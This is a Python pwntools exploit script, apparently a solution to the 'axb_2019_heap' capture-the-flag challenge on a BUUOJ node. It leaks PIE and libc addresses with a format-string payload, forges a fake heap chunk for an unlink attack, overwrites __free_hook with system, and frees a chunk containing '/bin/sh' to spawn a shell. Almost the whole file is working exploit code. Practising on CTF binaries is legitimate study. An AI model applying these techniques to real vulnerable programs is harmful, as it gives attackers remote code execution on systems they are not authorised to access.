from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, search_fun, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
		search_addr = base + libc.dump(search_fun)
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + next(libc.search(b'/bin/sh'))
		search_addr = base + libc.sym[search_fun]

	return (base, system, binsh, search_addr)


s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='i386', log_level='debug')
binary = './axb_2019_heap'

context.binary = binary
elf = ELF(binary)
p = remote('node4.buuoj.cn',26133) if argv[1]=='r' else process(binary)
# p = remote('node4.buuoj.cn',29924) if argv[1]=='r' else process(binary,
#             env={"LD_PRELOAD":"/home/javayuan/pwn_libc合集/Ubuntu16_32/libc-2.23_32.so"})
#替换libc和ld
# p = process(["/path/to/ld.so", binary],
#             env={"LD_PRELOAD":"/path/to/libc.so.6"})
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('/home/javayuan/pwn_libc合集/Ubuntu16_64/libc-2.23.so')

def bytes2int(content):
	return str(content,encoding='utf-8')
def int2bytes(content):
	return bytes(str(content),encoding='utf-8')
def dbg():
	gdb.attach(p)
	pause()
# start
def add(index,len,content=b'a'):
    sla(b'>> ',b'1')
    sla(b':', int2bytes(index))
    sla(b'size:',int2bytes(len))
    sla(b'content: ',content)

# def show(index):
#     sla(b'>> ',b'3')
#     sla(b':',int2bytes(index))

def edit(index,content):
    sla(b'>> ',b'4')
    sla(b'index:',int2bytes(index))
    sla(b'content: ',content)

def delete(index):
    sla(b'>> ',b'2')
    sla(b':',int2bytes(index))

#因为开启了pie所以不能用got表ret2libc

p.recvuntil(b'name: ')
p.sendline(b'%11$p%15$p')  #main+28 在11位 libc_start_main+240在第15位
p.recvuntil(b'Hello, ')
base = int(bytes2int(p.recv(14)),16)-28-0x116A     #0x116A是main函数的地址
libcbase = int(bytes2int(p.recv(14)),16)-libc.sym['__libc_start_main']-240
system=libcbase+libc.sym['system']
free_hook=libcbase+libc.sym['__free_hook']

#unlink
ptr = base+0x202060
#经测试，add分配的堆块从ptr+0x8的位置开始，第二个堆块在ptr+0x10的位置
fd = ptr - 0x18
bk = ptr - 0x10

add(0,0x98) # 0 用于伪造fake chunk
add(1,0x98) # 1 用于和fake chunk合并
add(2,0x90) # 2
add(3,0x90,b'/bin/sh\x00') # 3 未修改chunk 用于保存 /bin/sh参数

payload = p64(0) + p64(0x91) #fake chunk 大小为0x20
payload += p64(fd) + p64(bk)
payload += b'a'*0x70
payload += p64(0x90) + p8(0xa0)
edit(0, payload)
# dbg()
delete(1)

payload = b'a'*0x18 + p64(free_hook) + p64(0x10)
edit(0, payload)

edit(0,p64(system))
print(hex(ptr))
delete(3)

itr()